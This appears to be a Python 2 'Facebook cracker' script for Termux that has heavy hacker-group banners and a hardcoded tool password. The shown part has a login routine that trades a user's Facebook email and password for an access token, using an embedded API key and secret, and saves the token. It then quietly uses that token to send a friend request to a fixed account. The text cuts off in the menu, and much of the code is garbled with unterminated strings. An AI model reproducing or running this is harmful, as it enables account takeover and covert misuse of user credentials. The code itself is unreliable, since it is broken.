#!/usr/bin/python2

#coding=utf-8

#The Credit For This Code Goes To dogarhacker

#If You Wanna Take Credits For This Code, Please Look Yourself Again...

#Reserved2020

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize

from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError

from mechanize import Browser

reload(sys)

sys.setdefaultencoding('utf8')

br = mechanize.Browser()

br.set_handle_robots(False)

br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)

br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():

	print "\x1b[1;91mExit"	os.sys.exit()

def acak(b):

    w = 'ahtdzjc'

    d = ''

    for i in x:

        d += '!'+w[random.randint(0,len(w)-1)]+i

    return cetak(d)

def cetak(b):

    w = 'ahtdzjc'

    for i in w:

        j = w.index(i)

        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))

    x += '\033[0m'

    x = x.replace('!0','\033[0m')

    sys.stdout.write(x+'\n')

def jalan(z):

	for e in z + '\n':

		sys.stdout.write(e)

		sys.stdout.flush()

		time.sleep(0.01)

#Dev:BALOCH_hacker

##### LOGO #####

logo = """

\033[1;96m

\033[1;96m

\033[1;96m

\033[1;96m

\033[1;96m

\033[1;96m

Samama Hacker 

killer YT 302

03011225992

\033[1;96m

\033[1;96m

\033[1;96m

\033[1;96m

\033[1;96m

                     

          Arial ASCII Art

Image:    prev  next patorjk.com

¤´¯`·.¸.·•´¯`•·.¸¸.·´ Ýôgi ßëår `·.¸¸.·•´¯`•·.¸.·´¯`¤. 

                         ƒôr                       •Å(V)åö 

         ;' ·,       ,         GANOOK98         •98• 

         ;     '·, ,'·,  ' ·, 

         ',       ,'   ' ·,    ' ·, 

  , · " " ·,     :',       '·,      ' · ,          ,   ·  ' ; 

,"::' ·,::   ", ,':::' ,       ' · ,   ,  ,' ·  '            ; 

¦::                 ' ··,:::::':·,......  , ' 

",:::      ,":::::          ' ··,::,::,'_._._._._._._._._._', 

         ,"::::::          ´   , "      „ „",  ,"      „ „', 

        ,"::::                 ;     „"   ,"   ;     „"  ," 

        ;::::                   "„    ", "     ",  „ "„ " ; 

        ;:::       , "  "   "   "   "     „"·::::::::::::::"„- , 

        ;::      ,"                         "„·:::::::::::::·„" 

        ;::      ;                             "„·:::::::„" 

        ",::    ;         ,·'                       ", " 

          ",::   ",       '·,         ˆ ·,         ,·'    ,ˆ 

            ",::   ",                     ˆ · , ,' , · ˆ    ," 

            _",:::   ",_._._._._._._.      _._._ ," 

          ,'                             ,":::",          ', 

        ,'                            ,"::::::::",          ', 

       ,'                           ,' ",::::::::,",          ', 

      ,',.,. ,.,.,.,.,.,.,.,.,.,.,.,"   "::::"    ", 

         ,":::::                       ,":::",        º² "BALOCH

       ,":::                          ,"::::::",            ", 

      ,"::                          ,":::::::::",            ", 

     ,"::                          ,":::::::::::",            ", 

        ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹«•š

     

  

   |___'|.·´    samamahacker    -«

\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mSamamahacker\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•

\033[1;96m:•◈•╔╗─────────╔╗───────╔╗

\033[1;96m:•◈•

\033[1;96m:•◈•

\033[1;96m:•◈•

\033[1;96m:•◈•

\033[1;96m:•◈•

\033[1;97m:•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBalochhacker\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"""

	titik = ['.   ','..  ','... ']

	for o in titik:

		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)

back = 0

berhasil = []

cekpoint = []

oks = []

id = []

listgrup = []

vulnot = "\033[31mNot Vuln"

vuln = "\033[32mVuln"

os.system("clear")

print  """

\033[1;96m

\033[1;96m

\033[1;96m

\033[1;96m

\033[1;96m

\033[1;96m

\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;93mBalochhacker\033[1;96m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"""

jalan("\033[1;96m

jalan("\033[1;96m

jalan("\033[1;96m

jalan("\033[1;96m

jalan("\033[1;96m-------

jalan("\033[1;96m

jalan("\033[1;96m-------

jalan("\033[1;96m-------

jalan("\033[1;96m-------

jalan("\033[1;96m-------

jalan("\033[1;96m-------

jalan("\033[1;96m-------

jalan("\033[1;96m-------

jalan("\033[1;96m-------

jalan("\033[1;96m-------..................|_|___l___l_l_#

..................l_l___l___l_l_#

.............//_____//____//__

............//_____//____//___

...........12____//____//____

.............34__//____//_____

..............56_//____//______

...........***B@Lo©H**___

***|.....|....l....l....l***l_____

***|.....|***|An0NyM0U$__

***|`••••'|`•••'|H@©KE®_

***|`••••'|`•••'|GW@D@R___

***#####H4/H@Cke®_

***BLACKMAFIA**___✓✓

***BLACKMAFIA**PAK__

***SAMAMA HACKER**____

***™°=®¶∆HACK_____

***##P4##PAKISTAN___

***Z4##ZINDABAD_____

***J4#A❤S

***S4##SAMAMAHACKER

.......(HACKTHEHACKER)/

.......(BEHACKER)***____

.......(ANONAYMOUS)___

jalan("\033[1;96m-------

jalan("\033[1;96m-------

jalan("\033[1;96m-------

jalan("\033[1;96m-------

jalan("\033[1;96m-------

jalan("\033[1;96m--------

jalan("\033[1;96m--------

jalan("\033[1;96m--------

jalan("\033[1;96m--------

jalan("\033[1;96m-------

jalan("\033[1;96m--------

jalan("\033[1;96m--------

jalan("\033[1;96m---------

jalan("\033[1;96m---------

jalan("\033[1;96m---------

jalan("\033[1;96m----------

jalan("\033[1;96m----------

jalan("\033[1;96m------------

jalan("\033[1;96m-------------

jalan("\033[1;96m------------

jalan("\033[1;96m--------------

jalan("\033[1;96m----------------

jalan("\033[1;96m--------------

jalan("\033[1;96m--------------

jalan("\033[1;96m----------------                       

jalan("\033[1;96m-----------------

jalan("\033[1;96m

jalan("\033[1;96m

jalan("\033[1;96m┃  ______                __            

  / ____/________ ______/ /_____  _____

 / /   / ___/ __ `/ ___/ //_/ _ \/ ___/

/ /___/ /  / /_/ / /__/ ,< /  __/ /    

\____/_/   \__,_/\___/_/|_|\___/_/ 

jalan("\033[1;96m

jalan("\033[1;96m

jalan("\033[1;96m

jalan("\033[1;96m

jalan("\033[1;96m

jalan('\033[1;93m              Welcome to KILLER YT 303 GROUP

print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;96mSAMAMAHACKER\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

CorrectUsername = "Samama"

CorrectPassword = "hacker"

loop = 'true'

while (loop == 'true'):

    username = raw_input("\033[1;97m📋 \x1b[1;96mTool Username \x1b[1;97m»» \x1b[1;97m")

    if (username == CorrectUsername):

    	password = raw_input("\033[1;97m🗝 \x1b[1;96mTool Password \x1b[1;97m»» \x1b[1;97m")

        if (password == CorrectPassword):

            print "Logged in successfully as " + username #Dev:baloch_hacker

	    time.sleep(2)

            loop = 'false'

        else:

            print "\033[1;96mWrong Password"

            os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

    else:

        print "\033[1;96mWrong Username"

        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

def login():

	os.system('clear')

	try:

		toket = open('login.txt','r')

		menu() 

	except (KeyError,IOError):

		os.system('clear')

		print logo

		jalan(' \033[1;93mWarning: \033[1;96mDo Not Use Your Personal Account' )

		jalan(' \033[1;93mWarning: \033[1;96mUse a New Account To Login' )

		jalan(' \033[1;93mWarning: \033[1;96mTermux  All version Work✅' )          Must Subscribe SAMAMA  Hacker       

		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;93mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"

		print('	   \033[1;97m▬\x1b[1;94m.........LOGIN WITH FACEBOOK........\x1b[1;97m▬' )

		print('	' )

		id = raw_input('\033[1;97m[+] \x1b[1;94mID/Email\x1b[1;97m: \x1b[1;94m')

		pwd = raw_input('\033[1;97m[+] \x1b[1;94mPassword\x1b[1;97m: \x1b[1;94m')

		tik()

		try:

			br.open('https://m.facebook.com')

		except mechanize.URLError:

			print"\n\x1b[1;97mThere is no internet connection"

			keluar()

		br._factory.is_html = True

		br.select_form(nr=0)

		br.form['email'] = id

		br.form['pass'] = pwd

		br.submit()

		url = br.geturl()

		if 'save-device' in url:

			try:

				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'

				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}

				x=hashlib.new("md5")

				x.update(sig)

				a=x.hexdigest()

				data.update({'sig':a})

				url = "https://api.facebook.com/restserver.php"

				r=requests.get(url,params=data)

				z=json.loads(r.text)

				unikers = open("login.txt", 'w')

				unikers.write(z['access_token'])

				unikers.close()

				print '\n\x1b[1;96mLogin Successful.•◈•..'

				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')

				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])

				menu()

			except requests.exceptions.ConnectionError:

				print"\n\x1b[1;97mThere is no internet connection"

				keluar()

		if 'checkpoint' in url:

			print("\n\x1b[1;97mYour Account is on Checkpoint")

			os.system('rm -rf login.txt')

			time.sleep(1)

			keluar()

		else:

			print("\n\x1b[1;94mPassword/Email is wrong")

			os.system('rm -rf login.txt')

			time.sleep(1)

			login()

def menu():

	os.system('clear')

	try:

		toket=open('login.txt','r').read()

	except IOError:

		os.system('clear')

		print"\x1b[1;94mToken invalid"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	try:

		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)

		a = json.loads(otw.text)

		nama = a['name']

		id = a['id']

	except KeyError:

		os.system('clear')

		print"\033[1;97mYour Account is on Checkpoint"

		os.system('rm -rf login.txt')

		time.sleep(1)

		login()

	except requests.exceptions.ConnectionError:

		print"\x1b[1;94mThere is no internet connection"

		keluar()

	os.system("clear") #Dev:baloch_hacker

	print logo

	print "  \033[1;97m«----•◈••◈•----\033
